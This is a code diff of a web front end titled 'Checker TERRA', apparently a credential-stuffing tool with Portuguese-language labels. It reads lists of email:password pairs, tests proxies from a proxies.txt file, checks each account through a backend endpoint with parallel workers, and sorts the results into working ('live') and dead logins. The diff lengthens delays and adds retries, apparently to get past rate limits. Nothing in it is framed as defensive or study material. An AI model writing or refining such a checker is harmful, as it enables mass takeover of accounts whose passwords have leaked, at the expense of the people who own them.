@@ -111,7 +111,7 @@ main{max-width:1100px;margin:0 auto;padding:2.5rem 1.5rem;position:relative;z-in
 </div>
 </nav>
 <main>
-<div class="hero"><h1>Checker <span>TerraMail</span></h1><p>Kroenen Automation Engine · OAuth2 TerraMail Validator</p></div>
+<div class="hero"><h1>Checker <span>TERRA</span></h1><p>Kroenen Automation Engine · OAuth2 TERRA Validator</p></div>
 <div class="stats">
 <div class="stat-card"><div class="stat-icon" style="background:rgba(124,58,237,.12)"><svg style="stroke:var(--accent-hi)" viewBox="0 0 24 24"><path d="M4 4h16v3H4zM4 11h16v2H4zM4 17h10v2H4z"/></svg></div><div><div class="stat-label">Total</div><div class="stat-val" id="statTotal">0</div></div></div>
 <div class="stat-card"><div class="stat-icon" style="background:var(--success-bg)"><svg style="stroke:var(--success)" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg></div><div><div class="stat-label">Live</div><div class="stat-val" id="statLive" style="color:var(--success)">0</div></div></div>
@@ -147,8 +147,8 @@ zone.addEventListener('drop',function(e){e.preventDefault();zone.classList.remov
 
 var accounts=[],proxies=[],activeProxy='',currentIndex=0,liveCount=0,dieCount=0,isRunning=false,allResults=[];
 var THREADS=2;
-var DELAY_BETWEEN_CHECKS=1000;
-var MAX_FRONTEND_RETRIES=3;
+var DELAY_BETWEEN_CHECKS=1500;
+var MAX_FRONTEND_RETRIES=5;
 
 function readFile(file){return new Promise(function(resolve,reject){var reader=new FileReader();reader.onload=function(e){resolve(e.target.result);};reader.onerror=function(){reject(new Error('Erro ao ler arquivo'));};reader.readAsText(file);});}
 function sleep(ms){return new Promise(function(resolve){setTimeout(resolve,ms);});}
@@ -162,35 +162,79 @@ async function startChecker(){
     try{
         proxies=[];activeProxy='';
         try{var res=await fetch('api.php?action=init');var d=await res.json();proxies=d.proxies||[];}catch(e){proxies=[];}
+
         if(proxies.length>0){
             btn.innerHTML='Testando '+proxies.length+' proxies...';
             document.getElementById('statusText').textContent='Testando proxies...';
             for(var p=0;p<proxies.length;p++){
                 document.getElementById('statusText').textContent='Testando proxy '+(p+1)+'/'+proxies.length+'...';
-                try{var fd=new FormData();fd.append('proxy',proxies[p]);var pres=await fetch('api.php?action=test_proxy',{method:'POST',body:fd});var pdata=await pres.json();if(pdata.status==='ok'){activeProxy=proxies[p];document.getElementById('statusText').textContent='Proxy conectado! Iniciando...';break;}}catch(e){}
-                await sleep(300);
+                try{
+                    var fd=new FormData();
+                    fd.append('proxy',proxies[p]);
+                    var pres=await fetch('api.php?action=test_proxy',{method:'POST',body:fd});
+                    var pdata=await pres.json();
+                    if(pdata.status==='ok'){
+                        activeProxy=proxies[p];
+                        document.getElementById('statusText').textContent='Proxy conectado! Iniciando inspeção...';
+                        break;
+                    }
+                }catch(e){}
+                await sleep(500);
             }
-            if(activeProxy===''){alert('Nenhum proxy funcional encontrado em proxies.txt.\n\nCorrija a lista e tente novamente.');btn.disabled=false;btn.innerHTML='Iniciar Inspeção';document.getElementById('statusText').textContent='Nenhum proxy funcional · bloqueado';return;}
+            if(activeProxy===''){
+                alert('Nenhum proxy funcional encontrado em proxies.txt.\n\nCorrija a lista e tente novamente.');
+                btn.disabled=false;
+                btn.innerHTML='Iniciar Inspeção';
+                document.getElementById('statusText').textContent='Nenhum proxy funcional · bloqueado';
+                return;
+            }
         }
+
         var text=await readFile(fileInput.files[0]);
         accounts=[];
         var lines=text.split(/\r?\n/);
-        for(var i=0;i<lines.length;i++){var line=lines[i].trim();if(line&&line.indexOf(':')>-1){var idx=line.indexOf(':');var em=line.substring(0,idx).trim();var pw=line.substring(idx+1).trim();if(em.indexOf('@')>-1&&pw.length>0){accounts.push({email:em,password:pw});}}}
-        if(!accounts.length){alert('Nenhuma conta valida encontrada.');btn.disabled=false;btn.innerHTML='Iniciar Inspeção';return;}
+        for(var i=0;i<lines.length;i++){
+            var line=lines[i].trim();
+            if(line&&line.indexOf(':')>-1){
+                var idx=line.indexOf(':');
+                var em=line.substring(0,idx).trim();
+                var pw=line.substring(idx+1).trim();
+                if(em.indexOf('@')>-1&&pw.length>0){
+                    accounts.push({email:em,password:pw});
+                }
+            }
+        }
+
+        if(!accounts.length){
+            alert('Nenhuma conta valida encontrada.');
+            btn.disabled=false;
+            btn.innerHTML='Iniciar Inspeção';
+            return;
+        }
+
         document.getElementById('statTotal').textContent=accounts.length;
         document.getElementById('statusText').textContent=accounts.length+' contas carregadas · iniciando...';
         document.getElementById('fileName').textContent=accounts.length+' contas · '+fileInput.files[0].name;
+
         isRunning=true;currentIndex=0;liveCount=0;dieCount=0;allResults=[];
         document.getElementById('liveList').innerHTML='';
         document.getElementById('dieList').innerHTML='';
         updateCounts();
         btn.innerHTML='Inspecionando...';
+
         var workers=[];
         for(var j=0;j<THREADS;j++)workers.push(worker());
         await Promise.all(workers);
+
         document.getElementById('statusText').textContent='Concluido! '+accounts.length+' contas · '+liveCount+' live · '+dieCount+' dead';
         btn.innerHTML='Processo Finalizado';
-    }catch(err){console.error('Erro:',err);document.getElementById('statusText').textContent='Erro: '+err.message;btn.disabled=false;btn.innerHTML='Iniciar Inspeção';isRunning=false;}
+    }catch(err){
+        console.error('Erro:',err);
+        document.getElementById('statusText').textContent='Erro: '+err.message;
+        btn.disabled=false;
+        btn.innerHTML='Iniciar Inspeção';
+        isRunning=false;
+    }
 }
 
 async function worker(){
@@ -207,20 +251,15 @@ async function worker(){
     }
 }
 
-// CORREÇÃO PRINCIPAL: só aceita "die" se for "Invalid credentials"
-// Se for "Connection failed", tenta novamente até MAX_FRONTEND_RETRIES
 async function checkAccountWithRetry(email,password,proxy){
     for(var attempt=0;attempt<MAX_FRONTEND_RETRIES;attempt++){
         if(attempt>0){
             document.getElementById('statusText').textContent='Retentando '+email+' (tentativa '+(attempt+1)+'/'+MAX_FRONTEND_RETRIES+')...';
-            await sleep(2000);
+            await sleep(3000);
         }
         var result=await checkAccount(email,password,proxy);
-        // Só é conclusivo se: live OU Invalid credentials
         if(result==='live'||result==='invalid'){return;}
-        // Se chegou aqui, foi "Connection failed" — tenta novamente
     }
-    // Esgotou todas as tentativas — marca como die com Connection failed
     allResults.push({email:email,password:password,status:'die'});
     dieCount++;
     addToList('dieList',email+':'+password+' · Connection failed (retry esgotado)','die-text');
@@ -249,7 +288,6 @@ async function checkAccount(email,password,proxy){
             updateCounts();
             return 'invalid';
         }
-        // Connection failed — NÃO marca como die, retorna para retry
         return 'connection_failed';
     }catch(e){
         return 'connection_failed';
